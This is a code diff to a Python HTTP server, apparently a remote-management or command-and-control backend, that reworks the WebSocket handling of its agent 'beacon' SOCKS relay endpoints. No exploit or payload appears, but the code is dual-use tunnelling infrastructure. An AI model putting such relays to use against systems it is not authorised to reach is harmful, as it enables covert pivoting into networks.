@@ -935,16 +935,22 @@ class RMMHandler(BaseHTTPRequestHandler):
         """Agent SOCKS relay channel (beacon auth). Main /cmd beacon stays HTTP."""
         ws = WebSocketConnection.from_http_request(
             self.connection,
-            {k: self.headers[k] for k in self.headers},
+            self.headers,
             self.path,
         )
         if not ws:
-            self._respond(400, "WebSocket handshake failed")
+            self._respond(
+                400,
+                "WebSocket handshake failed (need Sec-WebSocket-Key and Version 13)",
+            )
             return True
         self.server_instance.touch_session(session_id)
         if not self.server_instance.socks.attach_agent_ws(session_id, ws):
+            try:
+                ws.send_json({"op": "active", "active": False})
+            except Exception:
+                pass
             ws.close()
-            self._respond(403, "SOCKS relay not active")
             return True
         self.close_connection = False
         try:
@@ -1422,10 +1428,17 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self.server_instance.touch_session(session_id)
                 self._respond(200, "PONG")
 
-        elif path == "/socks":
+        elif path in ("/socks", "/socks-ws"):
             err, session_id = self._beacon_session_id_from_qs(qs)
             if err:
                 self._respond(400, err)
+            elif self.headers.get("Upgrade", "").lower() == "websocket":
+                if not self.server_instance.socks_active(session_id):
+                    self._respond(403, "SOCKS relay not active")
+                else:
+                    self._handle_socks_agent_websocket(session_id)
+            elif path == "/socks-ws":
+                self._respond(426, "Upgrade Required")
             else:
                 self.server_instance.touch_session(session_id)
                 tasks = self.server_instance.socks.poll_tasks(session_id)
@@ -1435,17 +1448,6 @@ class RMMHandler(BaseHTTPRequestHandler):
                     json.dumps({"active": active, "tasks": tasks}),
                     "application/json",
                 )
-
-        elif path == "/socks-ws":
-            err, session_id = self._beacon_session_id_from_qs(qs)
-            if err:
-                self._respond(400, err)
-            elif self.headers.get("Upgrade", "").lower() != "websocket":
-                self._respond(426, "Upgrade Required")
-            elif not self.server_instance.socks_active(session_id):
-                self._respond(403, "SOCKS relay not active")
-            else:
-                self._handle_socks_agent_websocket(session_id)
         
         else:
             self._respond(404, "Not Found")
